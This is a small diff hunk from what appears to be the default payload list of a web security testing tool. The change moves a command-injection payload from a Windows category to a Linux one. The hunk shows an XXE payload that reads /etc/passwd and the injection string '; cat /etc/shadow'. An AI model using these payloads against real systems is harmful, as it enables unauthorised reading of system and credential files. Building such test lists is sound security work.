@@ -23,7 +23,7 @@ let defaults = {
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY read SYSTEM \"file:///etc/passwd\">]><root>&read;</root>"
     },
     { "id": "6",
-      "parentId":"command-injection-windows",
+      "parentId":"command-injection-linux",
       "payload": "; cat /etc/shadow"
     },
     { "id": "7",
